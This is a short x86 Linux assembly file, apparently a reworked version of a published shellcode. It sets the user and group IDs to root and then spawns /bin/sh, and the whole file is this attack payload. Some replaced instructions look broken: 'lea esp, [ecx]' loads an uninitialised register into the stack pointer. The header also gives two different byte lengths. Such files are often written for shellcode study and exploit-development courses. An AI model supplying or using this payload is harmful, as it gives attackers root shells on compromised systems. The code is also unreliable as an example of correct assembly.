	; http://shell-storm.org/shellcode/files/shellcode-251.php
	; (Linux/x86) setuid(0) + setgid(0) + execve("/bin/sh", ["/bin/sh", NULL]) 37 bytes
	; length - 45 byte
	section .text
global _start
_start:
	push 0x17
	mov eax, [esp]	; replaced
	sub ebx, ebx	; replaced
	imul edi, ebx	; replaced
	int 0x80

	push 0x2e
	mov eax, [esp]	; replaced
	push edi 	; replaced
	int 0x80

	sub edx, edx	; replaced
	push 0xb
	pop eax
	push edi	; replaced
	push 0x68732f2f
	push 0x6e69622f
	lea ebx, [esp]	; replaced
	push edi	; replaced
	push edi	; replaced
	lea esp, [ecx]	; replaced
	int 0x80
